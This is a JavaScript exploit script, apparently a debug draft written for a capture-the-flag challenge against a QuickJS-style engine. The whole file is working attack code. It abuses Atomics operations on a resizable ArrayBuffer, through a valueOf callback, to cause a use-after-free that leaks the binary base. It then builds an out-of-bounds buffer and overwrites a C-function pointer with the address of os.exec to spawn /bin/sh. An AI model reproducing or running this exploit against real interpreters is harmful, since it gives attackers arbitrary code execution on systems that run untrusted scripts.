// Debug: What's different with stdin?
const JS_CLASS_C_FUNCTION = 12;
const FREE_FUNC_OFFSET = 0x109d40n;
const JS_OS_EXEC_OFFSET = 0x10b900n;

function hex(n) {
    if (typeof n === 'bigint') {
        if (n < 0n) return '-0x' + (-n).toString(16);
        return '0x' + n.toString(16);
    }
    return '0x' + n.toString(16);
}

function uafRead(fieldIndex, numVictims) {
    let trigger_ab = new ArrayBuffer(56, { maxByteLength: 4096 });
    let trigger_view = new BigInt64Array(trigger_ab);
    for (let i = 0; i < 7; i++) trigger_view[i] = 0x4141414141414141n;
    let victims = [];
    let triggered = false;
    let malicious = {
        valueOf: function() {
            if (!triggered) {
                triggered = true;
                trigger_ab.resize(4096);
                for (let i = 0; i < numVictims; i++) {
                    victims.push(new ArrayBuffer(0x100));
                }
            }
            return 0xDEADDEADDEADDEADn;
        }
    };
    let dummy = { valueOf: () => 0n };
    return Atomics.compareExchange(trigger_view, fieldIndex, malicious, dummy);
}

function createOOB(numVictims) {
    let trigger_ab = new ArrayBuffer(56, { maxByteLength: 4096 });
    let trigger_view = new Int32Array(trigger_ab);
    for (let i = 0; i < 14; i++) trigger_view[i] = 0x41414141;
    let victims = [];
    let triggered = false;
    let malicious = {
        valueOf: function() {
            if (!triggered) {
                triggered = true;
                trigger_ab.resize(4096);
                for (let i = 0; i < numVictims; i++) {
                    victims.push(new ArrayBuffer(0x100));
                }
            }
            return 0x7FFFFFFF;
        }
    };
    Atomics.store(trigger_view, 0, malicious);
    for (let i = 0; i < victims.length; i++) {
        if (victims[i].byteLength !== 0x100) {
            return { found: true, victim: victims[i] };
        }
    }
    return { found: false };
}

function safeReadU64(dv, off) {
    try { return dv.getBigUint64(off, true); } catch (e) { return null; }
}

// Leak binary base
let binary_base = uafRead(6, 100) - FREE_FUNC_OFFSET;
print("base: " + hex(binary_base));
print("low bits: " + hex(binary_base & 0xFFFn));

let js_os_exec_addr = binary_base + JS_OS_EXEC_OFFSET;

// Create OOB
let oob = createOOB(300);
if (oob.found) {
    let dv = new DataView(oob.victim);
    print("OOB: " + hex(oob.victim.byteLength));

    // Find and corrupt C function
    for (let off = 0; off < 0x20000; off += 8) {
        let header = safeReadU64(dv, off);
        if (header === null) break;
        let class_id = Number((header >> 48n) & 0xFFFFn);
        if (class_id === JS_CLASS_C_FUNCTION) {
            let cfunc = safeReadU64(dv, off + 56);
            if (cfunc !== null && cfunc >= binary_base && cfunc < binary_base + 0x150000n) {
                print("Found at " + hex(off) + " cfunc=" + hex(cfunc - binary_base));
                // Corrupt
                dv.setBigUint64(off + 56, js_os_exec_addr, true);
                dv.setUint8(off + 64, 1);
                dv.setUint8(off + 65, 0);
                // Trigger
                (123).toString(["/bin/sh", "-c", "sh"]);
                break;
            }
        }
    }
} else {
    print("NO OOB");
}
